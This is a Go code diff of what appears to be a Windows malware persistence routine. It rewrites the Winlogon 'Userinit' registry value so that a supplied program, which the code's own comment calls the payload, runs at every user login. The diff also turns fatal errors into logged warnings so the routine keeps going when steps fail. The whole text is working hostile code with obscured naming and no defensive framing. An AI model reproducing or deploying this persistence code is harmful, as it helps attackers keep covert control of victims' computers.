@@ -10,7 +10,6 @@ import (
 )
 
 // C:\Windows\system32\userinit.exe,
-
 func HWND_W32_Method_Userinit(path string) error {
 	var wk32 registry.Key
 	var err error
@@ -23,7 +22,7 @@ func HWND_W32_Method_Userinit(path string) error {
 		},
 
 		Location:    fmt.Sprintf("%s\\_userinit.gUAC", os.Getenv("APPDATA")),
-		_K_Userinit: 0x7,
+		_K_Userinit: 0x9,
 	}
 
 	if len(c.Type)&len(c.Method) == 0 {
@@ -37,7 +36,7 @@ func HWND_W32_Method_Userinit(path string) error {
 	var currentDir string
 	currentDir, err = filepath.Abs(path)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	wk32, err = registry.OpenKey(
@@ -45,21 +44,21 @@ func HWND_W32_Method_Userinit(path string) error {
 		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
 	)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Setting DEFAULT key value for the %systemroot%\system32\userinit.exe, ABSOLUTE program path
 	// +0x23df ...
 
 	if err := wk32.SetStringValue("Userinit", fmt.Sprintf("%s\\System32\\userinit.exe, %s", os.Getenv("SYSTEMROOT"), currentDir)); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Absolute key function closing
 	// +0x54ef ...
 
 	if err := wk32.Close(); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Payload run will at login.
